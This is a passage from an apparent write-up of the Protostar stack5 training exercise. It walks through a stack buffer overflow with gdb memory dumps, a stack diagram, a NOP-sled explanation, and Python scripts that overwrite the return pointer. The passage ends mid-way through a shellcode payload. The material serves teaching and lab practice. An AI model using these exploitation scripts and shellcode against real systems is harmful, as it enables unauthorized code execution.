+<span class="o">(</span>gdb<span class="o">)</span> x/30x <span class="nv">$esp</span>     <span class="c"># Main's stack frame</span>
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff770:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff780:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff790:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff7a0:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0x45454545
+0xbffff7b0:	0x00000000	0xbffff854	0xbffff85c	0xb7fe1848
+
+<span class="o">(</span>gdb<span class="o">)</span> x 0xbffff7ac        <span class="c"># IP/Return pointer address</span>
+0xbffff7ac:	0x45454545 
+
+</code></pre></div></div>
+
+<p>From above it is possible to observe that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack.</p>
+
+<p>Payload will be updated to accommodate instructions to be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                               +--------------------+ 0x00000000
+                               |                    |
+                               | Unallocated        |
+                               | memory             |
+                               |                    |
+                               |                    |
+                               |                    |
+                            +-----------------------+ &lt;------+ Top of the stack (0xbffff724)
+                            |  | Local variables    |
+                            |  | 0x24 bytes         |
+                            |  +--------------------+
+                            |  | Previous EBP       |
+                get's stack+&gt;  | (0xbffff7a8)       |
+                frame       |  +--------------------+
+                            |  | Return pointer     |
+                            |  | (0x080483d9)       |
+                            +-----------------------+ &lt;------+ Stack pointer before calling gets (0xbffff750)
+                            |  |                    |
+           +----------------------------------------+ &lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+           |                |  |                    | &lt;------+ Main's EBP (0xbffff7a8)
+           |                |  | [Padding]          |
+           |   main's stack+&gt;  |                    |
+           |   frame        |  +--------------------+ &lt;------+ Main's Return Pointer (0xbffff7ac)
+Injected---&gt;                |  | [Overwritten       |
+payload    |                |  | return address]    |
+           |                +-----------------------+ &lt;------+ Stack pointer before calling main (0xbffff7b0)
+           |                   | [Injected          |
+           |                   | instructions]      |
+           |                   |                    |
+           +-------------------+--------------------+ 0xFFFFFFFF
+</code></pre></div></div>
+
+<p>Initially only an <code class="highlighter-rouge">int 3</code> instruction will be written to prove this concept.</p>
+
+<p><strong>Note</strong> <code class="highlighter-rouge">int3</code> is an instruction used to indicate a debug break. This means gdb will break when this instruction is executed. The opcode for <code class="highlighter-rouge">int3</code> is <code class="highlighter-rouge">0xCC</code></p>
+
+<p>The python script will be updated to reflect this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">xAA</span><span class="s">'</span> <span class="o">*</span> <span class="mi">76</span>
+<span class="n">returnPointer</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xbffff7b0</span><span class="p">)</span>
+<span class="n">instructions</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">xCC</span><span class="s">'</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span> <span class="o">+</span> <span class="n">instructions</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>By passing this input to gdb, and analyzing the stack just before ret gets called, it is possible to observe how the stack was changed:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; ~/in.txt
+Breakpoint 7, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="nt">-858993460</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff800<span class="o">)</span> at stack5/stack5.c:11
+11	<span class="k">in </span>stack5/stack5.c
+
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>main:
+0x080483c4 &lt;main+0&gt;:	push   ebp
+0x080483c5 &lt;main+1&gt;:	mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:	and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:	sub    esp,0x50
+0x080483cd &lt;main+9&gt;:	lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:	leave  
+0x080483da &lt;main+22&gt;:	ret    
+End of assembler dump.
+
+<span class="o">(</span>gdb<span class="o">)</span> x/30x <span class="nv">$esp</span> 
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff770:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff780:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff790:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff7a0:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xbffff7b0
+0xbffff7b0:	0xcccccccc	0xbffff800	0xbffff85c	0xb7fe1848
+0xbffff7c0:	0xbffff810	0xffffffff
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">main</code>’s return pointer is overwritten to 0xbffff7b0, this means that when the ret instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (<code class="highlighter-rouge">int3</code>) instruction.</p>
+
+<p>By continuing execution in GDB, we can observe that the injected payload was executed and that the breakpoint trap was surfaced to GDB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbffff7b1 <span class="k">in</span> ?? <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>Since some environmental variables of the system are pushed to the stack of an executing program, the content of the stack while analyzing the binary might be different from other execution runs (Eg. A different user runs the program, the program is run from a different path, the program is run from an ssh session vs local session, etc …). As a consequence, the content of the stack might change and the addresses that we calculated might be slightly different. As an example, let’s run the program from different paths or “environments” in our system. In our first environment the program was executed on the directory where the executable itself resides (/opt/protostar/bin) and the second environment was run from the home directory of the testing system (/home/user). Furthermore, the address where the environmental variables are in a different address as shown in the next examples:</p>
+
+<p><strong>Environment 1</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">pwd
+</span>Working directory /opt/protostar/bin.
+
+<span class="o">(</span>gdb<span class="o">)</span> show environment
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nv">SSH_CLIENT</span><span class="o">=</span>10.0.0.183 53269 22
+<span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/0
+<span class="nv">USER</span><span class="o">=</span>user
+<span class="nv">LS_COLORS</span><span class="o">=</span><span class="nv">rs</span><span class="o">=</span>0:di<span class="o">=</span>01<span class="p">;</span>34:ln<span class="o">=</span>01<span class="p">;</span>36:mh<span class="o">=</span>00:pi<span class="o">=</span>40<span class="p">;</span>33:so<span class="o">=</span>01<span class="p">;</span>35:do<span class="o">=</span>01<span class="p">;</span>35:bd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:cd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:or<span class="o">=</span>40<span class="p">;</span>31<span class="p">;</span>01:su<span class="o">=</span>37<span class="p">;</span>41:sg<span class="o">=</span>30<span class="p">;</span>43:ca<span class="o">=</span>30<span class="p">;</span>41:tw<span class="o">=</span>30<span class="p">;</span>42:ow<span class="o">=</span>34<span class="p">;</span>42:st<span class="o">=</span>37<span class="p">;</span>44:ex<span class="o">=</span>01<span class="p">;</span>32:<span class="k">*</span>.tar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tgz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.arj<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.taz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lzh<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lzma<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tlz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.txz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.zip<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.Z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.dz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.gz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.xz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.bz2<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.bz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tbz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tbz2<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.deb<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rpm<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.jar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.ace<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.zoo<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.cpio<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.7z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.jpg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.jpeg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.gif<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.bmp<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pbm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pgm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ppm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tga<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xbm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xpm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tif<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tiff<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.png<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.svg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.svgz<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mng<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pcx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mov<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mpg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mpeg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.m2v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mkv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mp4<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.m4v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mp4v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.vob<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.qt<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.nuv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.wmv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.asf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.rm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.rmvb<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.flc<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.avi<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.fli<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.flv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.gl<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.dl<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xcf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xwd<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.yuv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.cgm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.emf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.axv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.anx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.aac<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.au<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.flac<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mid<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.midi<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mka<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mp3<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mpc<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.ogg<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.ra<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.wav<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.axa<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.oga<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.spx<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.xspf<span class="o">=</span>00<span class="p">;</span>36:
+<span class="nv">PATH</span><span class="o">=</span>/opt/protostar/bin/<span class="o">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin
+<span class="nv">MAIL</span><span class="o">=</span>/var/mail/user
+<span class="nv">PWD</span><span class="o">=</span>/opt/protostar/bin
+<span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8
+<span class="nv">SHLVL</span><span class="o">=</span>1
+<span class="nv">HOME</span><span class="o">=</span>/home/user
+<span class="nv">LOGNAME</span><span class="o">=</span>user
+<span class="nv">SSH_CONNECTION</span><span class="o">=</span>10.0.0.183 53269 10.0.0.163 22
+<span class="nv">_</span><span class="o">=</span>/usr/bin/gdb
+<span class="nv">OLDPWD</span><span class="o">=</span>/opt/protostar
+<span class="nv">LINES</span><span class="o">=</span>47
+<span class="nv">COLUMNS</span><span class="o">=</span>131
+
+<span class="o">(</span>gdb<span class="o">)</span>x/500s <span class="nv">$esp</span>
+0xbffff950:	 <span class="s2">"/opt/protostar/bin/stack5"</span>
+0xbffff96a:	 <span class="s2">"USER=user"</span>
+0xbffff974:	 <span class="s2">"SSH_CLIENT=10.0.0.183 53269 22"</span>
+0xbffff993:	 <span class="s2">"MAIL=/var/mail/user"</span>
+0xbffff9a7:	 <span class="s2">"SHLVL=1"</span>
+0xbffff9af:	 <span class="s2">"OLDPWD=/opt/protostar"</span>
+0xbffff9c5:	 <span class="s2">"HOME=/home/user"</span>
+0xbffff9d5:	 <span class="s2">"SSH_TTY=/dev/pts/0"</span>
+0xbffff9e8:	 <span class="s2">"LOGNAME=user"</span>
+0xbffff9f5:	 <span class="s2">"_=/usr/bin/gdb"</span>
+0xbffffa04:	 <span class="s2">"COLUMNS=131"</span>
+0xbffffa10:	 <span class="s2">"TERM=xterm-256color"</span>
+0xbffffa24:	 <span class="s2">"PATH=/opt/protostar/bin/=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin"</span>
+0xbffffa85:	 <span class="s2">"LANG=en_US.UTF-8"</span>
+</code></pre></div></div>
+<p><strong>Environment 2</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">pwd
+</span>Working directory /home/user
+
+<span class="o">(</span>gdb<span class="o">)</span> show environment
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nv">SSH_CLIENT</span><span class="o">=</span>10.0.0.183 53915 22
+<span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/1
+<span class="nv">USER</span><span class="o">=</span>user
+<span class="nv">LS_COLORS</span><span class="o">=</span><span class="nv">rs</span><span class="o">=</span>0:di<span class="o">=</span>01<span class="p">;</span>34:ln<span class="o">=</span>01<span class="p">;</span>36:mh<span class="o">=</span>00:pi<span class="o">=</span>40<span class="p">;</span>33:so<span class="o">=</span>01<span class="p">;</span>35:do<span class="o">=</span>01<span class="p">;</span>35:bd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:cd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:or<span class="o">=</span>40<span class="p">;</span>31<span class="p">;</span>01:su<span class="o">=</span>37<span class="p">;</span>41:sg<span class="o">=</span>30<span class="p">;</span>43:ca<span class="o">=</span>30<span class="p">;</span>41:tw<span class="o">=</span>30<span class="p">;</span>42:ow<span class="o">=</span>34<span class="p">;</span>42:st<span class="o">=</span>37<span class="p">;</span>44:ex<span class="o">=</span>01<span class="p">;</span>32:<span class="k">*</span>.tar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tgz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.arj<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.taz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lzh<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lzma<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tlz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.txz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.zip<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.Z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.dz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.gz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.lz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.xz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.bz2<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.bz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tbz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tbz2<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.tz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.deb<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rpm<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.jar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rar<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.ace<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.zoo<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.cpio<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.7z<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.rz<span class="o">=</span>01<span class="p">;</span>31:<span class="k">*</span>.jpg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.jpeg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.gif<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.bmp<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pbm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pgm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ppm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tga<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xbm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xpm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tif<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.tiff<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.png<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.svg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.svgz<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mng<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.pcx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mov<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mpg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mpeg<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.m2v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mkv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mp4<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.m4v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.mp4v<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.vob<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.qt<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.nuv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.wmv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.asf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.rm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.rmvb<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.flc<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.avi<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.fli<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.flv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.gl<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.dl<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xcf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.xwd<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.yuv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.cgm<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.emf<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.axv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.anx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogv<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.ogx<span class="o">=</span>01<span class="p">;</span>35:<span class="k">*</span>.aac<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.au<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.flac<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mid<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.midi<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mka<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mp3<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.mpc<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.ogg<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.ra<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.wav<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.axa<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.oga<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.spx<span class="o">=</span>00<span class="p">;</span>36:<span class="k">*</span>.xspf<span class="o">=</span>00<span class="p">;</span>36:
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+<span class="nv">MAIL</span><span class="o">=</span>/var/mail/user
+<span class="nv">PWD</span><span class="o">=</span>/home/user
+<span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8
+<span class="nv">SHLVL</span><span class="o">=</span>1
+<span class="nv">HOME</span><span class="o">=</span>/home/user
+<span class="nv">LOGNAME</span><span class="o">=</span>user
+<span class="nv">SSH_CONNECTION</span><span class="o">=</span>10.0.0.183 53915 10.0.0.163 22
+<span class="nv">OLDPWD</span><span class="o">=</span>/opt/protostar/bin
+<span class="nv">_</span><span class="o">=</span>/usr/bin/gdb
+<span class="nv">LINES</span><span class="o">=</span>47
+<span class="nv">COLUMNS</span><span class="o">=</span>131
+
+<span class="o">(</span>gdb<span class="o">)</span>x/500s <span class="nv">$esp</span>
+0xbffff977:	 <span class="s2">"/opt/protostar/bin/stack5"</span>
+0xbffff991:	 <span class="s2">"USER=user"</span>
+0xbffff99b:	 <span class="s2">"SSH_CLIENT=10.0.0.183 53915 22"</span>
+0xbffff9ba:	 <span class="s2">"MAIL=/var/mail/user"</span>
+0xbffff9ce:	 <span class="s2">"SHLVL=1"</span>
+0xbffff9d6:	 <span class="s2">"OLDPWD=/opt/protostar/bin"</span>
+0xbffff9f0:	 <span class="s2">"HOME=/home/user"</span>
+0xbffffa00:	 <span class="s2">"SSH_TTY=/dev/pts/1"</span>
+0xbffffa13:	 <span class="s2">"LOGNAME=user"</span>
+0xbffffa20:	 <span class="s2">"_=/usr/bin/gdb"</span>
+0xbffffa2f:	 <span class="s2">"COLUMNS=131"</span>
+0xbffffa3b:	 <span class="s2">"TERM=xterm-256color"</span>
+0xbffffa4f:	 <span class="s2">"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
+0xbffffa8d:	 <span class="s2">"LANG=en_US.UTF-8"</span>
+</code></pre></div></div>
+
+<p>Therefore, it is preferable to “slide” the execution to the target address instead of pointing directly to it. To accomplish this, the usage of a <em>NOP-sled</em> is needed.</p>
+
+<h4 id="nop-sled">NOP-Sled</h4>
+
+<p>A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, as if we miss and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.</p>
+
+<h4 id="weaponization">Weaponization</h4>
+<p>To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on <a href="http://shell-storm.org/shellcode/files/shellcode-906.php">Andres C. Rodriguez </a>’s concept will be injected at the end of our payload. The Python script used to abuse the buffer overflow with a shellcode injection is:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">xAA</span><span class="s">'</span> <span class="o">*</span> <span class="mi">76</span>
+<span class="n">returnPointer</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xbffff7c0</span><span class="p">)</span>
+<span class="n">nop_sled</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">50</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x83</span><span class="si">\</span><span class="se">xc4</span><span class="si">\</span><span class="se">x18</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc0</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xdb</span><span class="si">\</span><span class="se">xb0</span><span class="si">\</span><span class="se">x06</span><span class="si">\</span><span class="se">xcd</span><span class="si">\</span><span class="se">x80</span><span class="si">\</span><span class="se">x53</span><span class="si">\</span><span class="se">x68</span><span class="s">/tty</span><span class="si">\</span><span class="se">x68</span><span class="s">/dev</span><span class="si">\</span><span class="se">x89</span><span class="si">\</span><span class="se">xe3</span><span class="si">\</span><span class="se">x31</span><span class="si">\</span><span class="se">xc9</span><span class="si">\</span><span class="se">x66</span><span class="si">\</span><span class="se">xb9</span><span 